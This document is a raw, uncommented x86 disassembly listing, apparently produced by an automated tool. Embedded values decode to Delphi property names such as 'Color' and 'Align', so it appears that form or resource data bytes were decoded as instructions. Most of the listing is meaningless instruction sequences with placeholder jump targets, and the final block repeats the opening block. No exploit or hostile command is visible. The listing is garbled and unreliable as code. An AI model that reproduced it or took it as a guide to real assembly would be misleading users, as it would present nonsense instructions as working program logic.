add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
outsb
inc ebp
outsb
inc esp
jb r-xdata
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41f844
jo r-xdata
sbb eax 0x3d7c0044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
insb
jae r-xdata
inc eax
add [ eax + 0x58004460 ] bl
inc eax
inc ecx
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
loopne r-xdata
xchg esp eax
jle r-xdata
add [ ecx + edi ] bl
inc ebx
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 - 0x7e7fffbf ] al
inc ebx
add [ edx + edx ] dh
inc esp
add [ ecx + eax * 4 + 0x1b4c0043 ] dl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi * 2 - 0x754fffbd ] dl
inc esp
add ah cl
inc esp
jb r-xdata
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xf800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
add [ ecx + edi ] bl
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add ah bh
add [ ebx ] 0x5
add [ eax + esi * 4 ] cl
push cs
mov al 0x5
add ch bh
push [ esi + 0x438394ff ]
add ah dl
add [ ebx ] 0xffffffe8
add [ ebx ] 0x0
test [ ebx ] al
jo r-xdata
inc esp
add [ edi + ebx * 2 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
add [ eax - 0x33ffbb76 ] dh
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ edi + edi * 2 ] ah
mov al 0xd1
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080040 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x73 ] bp
inc eax
add ah bl
pushad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
adc [ eax ] al
sbb al 0x2
add bh bh
clc
add [ ebx ] 0x1
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
js r-xdata
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
add [ edx + ebp * 2 - 0x7e7fffbf ] al
inc ebx
add [ edx + edx ] dh
inc esp
add [ ecx + eax * 4 + 0x1b4c0043 ] dl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
fsub [ eax + 0x43 ]
add ah cl
les eax [ edx ]
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
outsb
jae r-xdata
popad
jo r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
inc esp
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa465646f
int3
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi * 2 - 0x754fffbd ] dl
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add ah bh
add [ ebx ] 0xb
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + 0x43 ] ah
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
push esp
bound eax [ ebx ]
fsub [ ecx + 0x43 ]
add [ esi ] ch
add [ eax ] cl
inc ebp
js r-xdata
insb
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edx * 2 - 0x3a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ edx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
arpl [ ebx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0x43 ] ah
add [ eax ] ch
add al [ eax ]
add [ eax + 0x14004360 ] dl
jmp 0x3957627b
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax + 0x1e ]
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
xor [ edx + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push ds
jb r-xdata
outsb
je r-xdata
jb r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
inc ecx
add [ eax ] ch
int3
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500a00
outsb
je r-xdata
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dl
aas
inc ecx
add [ edx + eax ] dl
add bh bh
lodsb [ esi ]
add [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
outsb
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ecx ] cl
push eax
add [ eax - 0x80000000 ] al
and [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + eax ] bl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
add [ eax ] eax
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
insd
jae r-xdata
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
push 0x6948776f
outsb
je r-xdata
test [ esp + eax * 2 ] bl
add ah bh
cmp eax 0x44
add [ eax + 0x1 ] al
and eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
outsb
je r-xdata
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080020 ] al
push 0x6948776f
outsb
je r-xdata
sbb al 0x0
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
int3
sub_4358cd
push edi
inc ebx
add [ edi + edx * 2 + 0x43 ] bh
add [ ecx ] al
or [ ebp + 0x78 ] al
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add bh bh
jns r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add bh bh
cmp [ ecx + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
js r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
sub al 0x79
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
or [ ecx + 0x6c ] eax
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
add [ eax ] al
adc [ esi ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xda546564
inc ebx
add [ eax ] bl
add al [ eax ]
inc [ eax + 0x1004379 ]
add [ eax ] al
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
insb
imul esp [ edi + 0x6e ] r-xdata
pop ds
add al [ eax ]
jmp [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x33
inc ecx
add [ edi ] bl
movsb [ edi ] gs : [ esi ]
int3
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
jb r-xdata
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax + 0x43050016 ] al
outsd
insb
outsd
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
outsb
jae r-xdata
inc ebx
jb r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
fiadd [ ebx ]
sbb [ edx ] al
fiadd [ ebx ]
adc al [ edx ]
add bh bh
dec eax
jns r-xdata
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
add bh bh
add al 0x1f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
pop edi
add [ eax ] al
push [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
add [ eax ] al
insb
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x18ff0001 ] ah
xchg [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
sbb al 0x2
add bh bh
pushfd
jns r-xdata
jb r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edx ] bl
add bh bh
sub [ edi ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fild [ ebx ]
adc al 0x2
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x58ff0000
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
int3
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
mov [ ebx ] 0x7a
add [ eax ] al
adc [ eax ] al
test al 0x1
add bh bh
les esi [ eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + eax ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
je r-xdata
outsb
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
test [ esp + eax * 2 ] bl
add ah bh
cmp eax 0x44
add [ eax + 0x1 ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc8656c62
rol [ ebx ] cl
rol [ eax ] 0x0
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
sub [ edi ] 0x0
push cs
jpe r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0032 ] al
outsb
js r-xdata
add [ eax ] al
push esp
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
or al 0xd0
inc ebx
add al ch
push eax
outsd
jo r-xdata
int3
inc edi
je r-xdata
push esp
xor al 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
js r-xdata
imul esi [ ebp + 0x49 ] 0x786f666e
into
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec edi
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
iretd
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
rol [ ebx ] 0x1
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
rol [ ebx ] cl
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
outsb
push ebx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or ecx [ edi + 0x6e ]
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
add al ah
popad
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffbc9f ] ch
popad
inc ebx
add [ edx + eax ] ah
jb r-xdata
fmul st6
inc ebx
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
xor al 0x41
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
rol [ ebx ] 0x1
mov eax 0xb8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
mov ebx es
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
and al 0x2
inc esp
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add al bl
add [ eax ] al
rol [ ebx ] cl
rol [ ecx ] 0x1
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or eax 0x65476e4f
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
xchg esp eax
inc ebx
je r-xdata
add [ esi + esi + 0x40 ] dh
add [ edi + edi * 2 ] ah
inc ebx
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
sbb al 0x39
je r-xdata
loop r-xdata
jb r-xdata
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9425e97
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
outsb
inc ebp
outsb
inc esp
jb r-xdata
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41f844
jo r-xdata
sbb eax 0x3d7c0044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
insb
jae r-xdata
inc eax
add [ eax + 0x58004460 ] bl
inc eax
inc ecx
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
loopne r-xdata
xchg esp eax
jle r-xdata
add [ ecx + edi ] bl
inc ebx
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 - 0x7e7fffbf ] al
inc ebx
add [ edx + edx ] dh
inc esp
add [ ecx + eax * 4 + 0x1b4c0043 ] dl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi * 2 - 0x754fffbd ] dl
inc esp
add ah cl
inc esp
jb r-xdata
add bh bh
add al 0x1f
inc esp
